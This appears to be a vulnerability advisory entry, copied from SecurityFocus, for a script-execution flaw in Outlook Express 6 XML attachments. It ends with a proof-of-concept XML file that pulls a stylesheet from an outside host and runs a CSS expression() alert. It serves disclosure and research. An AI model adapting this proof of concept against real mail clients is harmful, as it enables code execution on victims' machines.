@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/5350/info
+
+An error has been reported in Microsoft Outlook Express which may allow malicious XML file attachments to execute arbitrary code in the context of the local system. Code execution could occur when the file attachment is opened, without further prompting or user interaction.
+
+This is the result of treatment of script code included in XSL style information embedded in an XML document. Normally, XSL style information is not permitted in XML scripts executing within a restricted security zone. However, some embedded script code may still execute, despite the generation of an XML parsing error. This script code may determine the location of the Temporary Internet File (TIF) directory, which in turn can lead to the execution of arbitrary code within the Local System security zone.
+
+This behavior has been reported in Outlook Express 6. Other versions of Outlook may share this vulnerability, this has not however been confirmed.
+
+<?xml version="1.0" ?>
+<?xml-stylesheet type="text/css"
+href="http://www.malware.com/malware.css" ?>
+<malware>
+
+<h4 style="position: absolute;top:39;left:expression(alert
+(document.location));font-family:arial;font-size:12pt;BACKGROUND-
+IMAGE:url('http://www.malware.com/youlickit.gif');background-
+repeat:no-repeat;background-position: 100 30;z-index:-
+100;height:200pt;width:400pt;font-family:Verdana;color:red">sure it
+can, malware says so</h4>
+</malware>
